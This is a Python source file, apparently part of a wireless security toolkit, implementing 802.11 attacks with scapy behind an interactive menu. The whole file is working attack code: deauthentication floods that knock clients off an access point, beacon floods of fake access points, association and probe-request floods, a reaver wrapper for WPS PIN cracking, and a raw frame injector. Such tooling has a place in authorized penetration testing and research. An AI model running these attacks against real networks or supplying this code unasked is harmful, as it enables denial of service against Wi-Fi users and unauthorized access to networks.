"""
Wireless attack module.

  * Deauth flood (broadcast + targeted)
  * Beacon flood (fake APs)
  * Association flood
  * Probe request flood
  * WPS (reaver) integration hook

All attacks require monitor mode + injection capable adapter (Linux).
"""
import random
import threading
import time

from open80211.core import ui
from open80211.core.config import CONFIG, check_platform
from open80211.core import netutils as nu
from open80211.core.interfaces import which

try:
    from scapy.all import sendp, RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, \
        Dot11AssocReq, Dot11Auth, Dot11Deauth, Dot11FCS
except Exception:
    pass


def _layer(pkt):
    """Build a RadioTap() + Dot11 packet safe for sendp."""
    return RadioTap() / pkt


def deauth_flood(iface: str, target_bssid: str, client_mac: str = "ff:ff:ff:ff:ff:ff",
                 count: int = 50, interval: float = 0.1) -> None:
    """Send deauthentication frames to force clients to reconnect."""
    if not check_platform("linux"):
        return
    ui.section("Deauth Flood", f"AP={target_bssid} client={client_mac}")
    bssid = nu.norm_mac(target_bssid)
    client = nu.norm_mac(client_mac)
    pkt = _layer(Dot11(addr1=client, addr2=bssid, addr3=bssid) /
                 Dot11Deauth(reason=7))
    ui.warn(f"Sending {count or 'continuous'} deauth frames... (stop handshake capture to collect handshake)")
    try:
        sent = 0
        while count == 0 or sent < count:
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
            time.sleep(interval)
        ui.ok("Deauth flood complete.")
    except KeyboardInterrupt:
        ui.info("Stopped.")
    except Exception as e:
        ui.error(f"Send failed: {e} (check monitor mode + permissions)")


def beacon_flood(iface: str, ssids: list, count: int = 20, channel: int = 6) -> None:
    """Broadcast fake beacons. Random OUI-generated BSSIDs."""
    if not check_platform("linux"):
        return
    ui.section("Beacon Flood", f"{len(ssids)} SSIDs x{count}")
    ui.warn("Generating fake access points... Ctrl+C to stop.")
    try:
        sent = 0
        while True:
            for ssid in ssids:
                bssid = nu.int2mac(random.getrandbits(48))
                pkt = _layer(Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                                   addr2=bssid, addr3=bssid) /
                             Dot11Beacon(cap=0x2104) /
                             Dot11Elt(ID=0, info=ssid.encode()) /
                             Dot11Elt(ID=3, info=bytes([channel])) /
                             Dot11Elt(ID=1, info=b"\x82\x84\x0b\x16"))
                sendp(pkt, iface=iface, verbose=False)
                sent += 1
            if sent >= count * len(ssids):
                break
    except KeyboardInterrupt:
        pass
    except Exception as e:
        ui.error(f"Send failed: {e}")
    ui.ok(f"Sent {sent} fake beacons.")


def assoc_flood(iface: str, target_bssid: str, count: int = 200) -> None:
    """Flood association requests to exhaust AP client table."""
    if not check_platform("linux"):
        return
    ui.section("Association Flood", f"AP={target_bssid}")
    bssid = nu.norm_mac(target_bssid)
    ui.warn("Sending association requests...")
    try:
        for i in range(count):
            fake = nu.int2mac(random.getrandbits(48))
            pkt = _layer(Dot11(type=0, subtype=0, addr1=bssid, addr2=fake, addr3=bssid) /
                         Dot11AssocReq() / Dot11Elt(ID=0, info=b"") / Dot11Elt(ID=1, info=b"\x00"))
            sendp(pkt, iface=iface, verbose=False)
        ui.ok("Association flood complete.")
    except KeyboardInterrupt:
        pass
    except Exception as e:
        ui.error(f"Send failed: {e}")


def probe_flood(iface: str, count: int = 200) -> None:
    """Flood probe requests with random MACs and SSIDs."""
    if not check_platform("linux"):
        return
    ui.section("Probe Request Flood")
    try:
        for _ in range(count):
            mac = nu.int2mac(random.getrandbits(48))
            ssid = "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789")
                           for _ in range(random.randint(1, 16)))
            pkt = _layer(Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
                               addr2=mac, addr3="ff:ff:ff:ff:ff:ff") /
                         Dot11ProbeReq() / Dot11Elt(ID=0, info=ssid.encode()))
            sendp(pkt, iface=iface, verbose=False)
        ui.ok("Probe flood complete.")
    except KeyboardInterrupt:
        pass
    except Exception as e:
        ui.error(f"Send failed: {e}")


def wps_attack(iface: str, target_bssid: str, channel: int = 0) -> None:
    """WPS PIN attack via reaver (external tool, if installed)."""
    from open80211.core.interfaces import system_command
    if not which("reaver"):
        ui.warn("reaver not found. Install: apt install reaver")
        return
    ui.section("WPS PIN Attack", f"AP={target_bssid}")
    cmd = f"reaver -i {iface} -b {target_bssid}"
    if channel:
        cmd += f" -c {channel}"
    cmd += " -vv"
    ui.info(f"Running: {cmd}")
    rc, out = system_command(cmd, timeout=600)
    ui.info(out[-3000:] if out else "No output.")
    if rc == 0:
        ui.ok("WPS attack finished.")


def injection_test(iface: str, bssid: str = "ff:ff:ff:ff:ff:ff") -> None:
    """Verify packet injection: send probes, watch for immediate ACKs."""
    if not check_platform("linux"):
        return
    ui.section("Injection Test", f"iface={iface}")
    bssid = nu.norm_mac(bssid)
    acks = 0
    sent = 20
    try:
        from scapy.all import sniff
        stop = threading.Event()

        def ack_counter(pkt):
            nonlocal acks
            if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == 1 and \
                    pkt.getlayer(Dot11).subtype == 13:  # ACK
                acks += 1

        t = threading.Thread(target=lambda: sniff(iface=iface, prn=ack_counter,
                                                  store=False, stop_filter=lambda p: stop.is_set()),
                             daemon=True)
        t.start()
        for _ in range(sent):
            pkt = _layer(Dot11(addr1=bssid, addr2=nu.int2mac(random.getrandbits(48)),
                               addr3=bssid) / Dot11ProbeReq() / Dot11Elt(ID=0, info=b""))
            sendp(pkt, iface=iface, verbose=False)
        time.sleep(2)
        stop.set()
        ui.info(f"Sent {sent} probe frames, received {acks} ACKs.")
        if acks:
            ui.ok(f"Injection verified ({acks * 100 // sent}% ACK rate).")
        else:
            ui.warn("No ACKs received. Driver may not support injection / AP not nearby.")
    except Exception as e:
        ui.error(str(e))


def send_raw_frame(iface: str) -> None:
    """Interactive arbitrary 802.11 frame injector (fuzzing/testing)."""
    if not check_platform("linux"):
        return
    ui.section("Frame Injector", "craft any 802.11 frame")
    while True:
        choice = ui.menu("Inject", [
            "Beacon (custom SSID)",
            "Deauth",
            "Auth frame",
            "Raw hex frame",
        ])
        if choice == 0:
            return
        try:
            if choice == 1:
                ssid = ui.ask("SSID")
                bssid = ui.ask("BSSID", default=nu.int2mac(random.getrandbits(48)))
                ch = ui.ask_int("Channel", default=6)
                count = ui.ask_int("Count", default=5)
                for _ in range(count):
                    pkt = _layer(Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                                       addr2=bssid, addr3=bssid) /
                                 Dot11Beacon(cap=0x2104) /
                                 Dot11Elt(ID=0, info=ssid.encode()) /
                                 Dot11Elt(ID=3, info=bytes([ch])))
                    sendp(pkt, iface=iface, verbose=False)
            elif choice == 2:
                bssid = ui.ask("AP BSSID")
                client = ui.ask("Client (blank = broadcast)", default="ff:ff:ff:ff:ff:ff")
                count = ui.ask_int("Count", default=10)
                for _ in range(count):
                    pkt = _layer(Dot11(addr1=client, addr2=bssid, addr3=bssid) /
                                 Dot11Deauth(reason=7))
                    sendp(pkt, iface=iface, verbose=False)
            elif choice == 3:
                bssid = ui.ask("AP BSSID")
                client = ui.ask("Client", default=nu.int2mac(random.getrandbits(48)))
                for seq in (1, 2):
                    pkt = _layer(Dot11(type=0, subtype=11, addr1=bssid, addr2=client,
                                       addr3=bssid) / Dot11Auth(seqnum=seq, status=0))
                    sendp(pkt, iface=iface, verbose=False)
            elif choice == 4:
                hexstr = ui.ask("Hex frame (no header; RadioTap auto-added)",
                                default="08020000ffffffffffff00000000000000000000000000000000")
                raw = bytes.fromhex(hexstr.replace(":", "").replace(" ", ""))
                pkt = RadioTap() / Dot11(raw)
                count = ui.ask_int("Count", default=1)
                for _ in range(count):
                    sendp(pkt, iface=iface, verbose=False)
            ui.ok("Frames injected.")
        except Exception as e:
            ui.error(str(e))


def attack_menu(iface: str) -> None:
    """Interactive attacks menu."""
    while True:
        choice = ui.menu("Attack Suite", [
            "Deauth flood (disconnect all clients)",
            "Deauth flood (target one client)",
            "Beacon flood (fake APs)",
            "Association flood",
            "Probe request flood",
            "WPS PIN attack (reaver)",
            "Injection test",
            "Frame injector (fuzz/craft)",
        ])
        if choice == 0:
            return
        if choice == 1:
            bssid = ui.ask("Target AP BSSID")
            n = ui.ask_int("Number of frames (0 = continuous)", default=50)
            deauth_flood(iface, bssid, count=n or 0)
        elif choice == 2:
            bssid = ui.ask("Target AP BSSID")
            client = ui.ask("Target client MAC", default="ff:ff:ff:ff:ff:ff")
            n = ui.ask_int("Number of frames", default=50)
            deauth_flood(iface, bssid, client, n)
        elif choice == 3:
            ssids = ui.ask("Comma-separated SSIDs (blank = 10 random)").strip()
            if not ssids:
                ssids = [f"FreeWiFi{i}" for i in range(10)]
            else:
                ssids = [s.strip() for s in ssids.split(",")]
            n = ui.ask_int("Rounds", default=20)
            beacon_flood(iface, ssids, n)
        elif choice == 4:
            bssid = ui.ask("Target AP BSSID")
            n = ui.ask_int("Number of requests", default=200)
            assoc_flood(iface, bssid, n)
        elif choice == 5:
            n = ui.ask_int("Number of probes", default=200)
            probe_flood(iface, n)
        elif choice == 6:
            bssid = ui.ask("Target AP BSSID")
            ch = ui.ask_int("Channel", default=0)
            wps_attack(iface, bssid, ch)
        elif choice == 7:
            injection_test(iface)
        elif choice == 8:
            send_raw_frame(iface)